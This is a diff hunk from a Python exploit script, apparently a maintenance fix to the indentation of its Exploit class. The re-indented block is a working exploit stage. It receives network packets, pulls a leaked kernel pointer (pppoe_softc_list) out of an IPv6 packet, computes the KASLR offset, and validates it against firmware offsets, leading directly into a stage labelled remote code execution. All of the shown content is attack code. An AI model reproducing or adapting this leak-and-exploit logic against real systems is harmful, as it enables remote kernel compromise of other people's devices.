@@ -762,42 +762,42 @@ class Exploit():
         start_time = time.time()
         timeout = 60  # Maximum wait time (e.g., 60 seconds)
 
-     while True:
-         try:
-        pkt = self.s.recv()
-        if pkt and pkt.haslayer(ICMPv6NDOptSrcLLAddr) and pkt[ICMPv6NDOptSrcLLAddr].len > 1:
-            break
-     except Exception as e:
-        print(f'[-] Error receiving packet: {e}')
-        traceback.print_exc()
-        exit(1)
-    
-    if time.time() - start_time > timeout:
-        print('[-] Timeout waiting for valid packet')
-        exit(1)
+        while True:
+                try:
+                        pkt = self.s.recv()
+                        if pkt and pkt.haslayer(ICMPv6NDOptSrcLLAddr) and pkt[ICMPv6NDOptSrcLLAddr].len > 1:
+                                break
+                except Exception as e:
+                        print(f'[-] Error receiving packet: {e}')
+                        traceback.print_exc()
+                        exit(1)
+                
+                if time.time() - start_time > timeout:
+                        print('[-] Timeout waiting for valid packet')
+                        exit(1)
 
-    try:
-      # Verify the packet contains the IPv6 layer before accessing its data
-       if not pkt.haslayer(IPv6):
-        print('[-] Packet does not contain IPv6 layer')
-        exit(1)
+        try:
+                # Verify the packet contains the IPv6 layer before accessing its data
+                if not pkt.haslayer(IPv6):
+                        print('[-] Packet does not contain IPv6 layer')
+                        exit(1)
 
-      # Extract the pppoe_softc_list address from the packet
-      self.pppoe_softc_list = unpack('<Q', bytes(pkt[IPv6])[0x43:0x4b])[0]
-      print(f'[+] pppoe_softc_list: {hex(self.pppoe_softc_list)}')
+                # Extract the pppoe_softc_list address from the packet
+                self.pppoe_softc_list = unpack('<Q', bytes(pkt[IPv6])[0x43:0x4b])[0]
+                print(f'[+] pppoe_softc_list: {hex(self.pppoe_softc_list)}')
 
-      # Calculate the KASLR offset
-      self.kaslr_offset = self.pppoe_softc_list - self.offs.PPPOE_SOFTC_LIST
-      print(f'[+] kaslr_offset: {hex(self.kaslr_offset)}')
+                # Calculate the KASLR offset
+                self.kaslr_offset = self.pppoe_softc_list - self.offs.PPPOE_SOFTC_LIST
+                print(f'[+] kaslr_offset: {hex(self.kaslr_offset)}')
 
-      # Verify the calculated address
-    if (self.pppoe_softc_list & 0xffffffff00000fff != self.offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff):
-        print('[-] Error: leak is invalid. Wrong firmware?')
-        exit(1)
-    except Exception as e:
-        print(f'[-] Error processing packet: {e}')
-        traceback.print_exc()
-        exit(1) 
+                # Verify the calculated address
+                if (self.pppoe_softc_list & 0xffffffff00000fff != self.offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff):
+                        print('[-] Error: leak is invalid. Wrong firmware?')
+                        exit(1)
+        except Exception as e:
+                print(f'[-] Error processing packet: {e}')
+                traceback.print_exc()
+                exit(1)
 
         print('')
         print('[+] STAGE 3: Remote code execution')
